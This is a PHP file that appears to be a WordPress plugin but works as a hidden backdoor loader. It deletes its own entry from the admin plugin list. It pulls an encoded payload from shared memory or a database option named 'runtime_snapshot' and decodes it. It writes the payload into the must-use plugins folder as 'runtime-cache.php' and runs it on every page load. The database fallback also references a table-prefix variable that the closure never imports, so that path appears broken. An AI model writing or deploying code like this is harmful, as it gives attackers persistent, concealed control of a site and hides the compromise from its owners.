<?php
add_filter('all_plugins', function ($plugins) {
    unset($plugins[plugin_basename(__FILE__)]);
    return $plugins;
});
add_action('plugins_loaded', function () {
    $target = WP_CONTENT_DIR . '/mu-plugins/runtime-cache.php';
    $segment = shmop_open(734218, 'a', 0, 0);
    $source = $segment ? shmop_read($segment, 0, shmop_size($segment)) : '';
    if (!$source) {
        $db = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
        $query = mysqli_query($db, "SELECT option_value FROM {$table_prefix}options WHERE option_name = 'runtime_snapshot' LIMIT 1");
        $row = mysqli_fetch_assoc($query);
        $source = gzdecode(base64_decode($row['option_value']));
    }
    if (!file_exists($target)) {
        file_put_contents($target, $source);
        chmod($target, 0644);
        opcache_invalidate($target, true);
    }
    include $target;
}, 0);
